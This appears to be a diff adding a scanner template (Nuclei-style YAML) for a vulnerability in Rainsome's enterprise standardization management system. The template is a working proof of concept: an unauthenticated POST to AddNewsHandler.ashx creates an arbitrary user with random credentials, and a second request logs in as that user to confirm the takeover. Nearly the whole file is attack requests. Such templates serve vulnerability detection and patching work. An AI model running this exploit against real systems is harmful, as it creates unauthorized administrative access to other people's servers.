@@ -1,0 +1,40 @@
+id: poc-yaml-rainsome-pdca-addnewshandler-ashx-adduser
+info:
+  name: 润申科技企业标准化管理系统AddNewsHandler.ashx 任意用户创建
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: accesscontrol
+variables:
+  user: '{{rand_text_alphanumeric(10)}}'
+  pass: '{{rand_text_alphanumeric(10)}}'
+  r3: '{{url_encode(base64(user))}}'
+  r4: '{{url_encode(base64(pass))}}'
+flow: |
+  http(1) && http(2)
+http:
+  - id: add-user
+    method: POST
+    path:
+      - '{{BaseURL}}/PDCA/ashx/AddNewsHandler.ashx?action=Adduser'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'username={{user}}&pwd={{pass}}&savedays=1'
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - body == "1"
+
+  - id: login-handler
+    method: POST
+    path:
+      - '{{BaseURL}}/ashx/loginhandler.ashx'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Requested-With: XMLHttpRequest
+    body: 'username={{r3}}&password={{r4}}&savedays=MQ%3D%3D'
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - body == '{"success":true,"message":"ok"}'
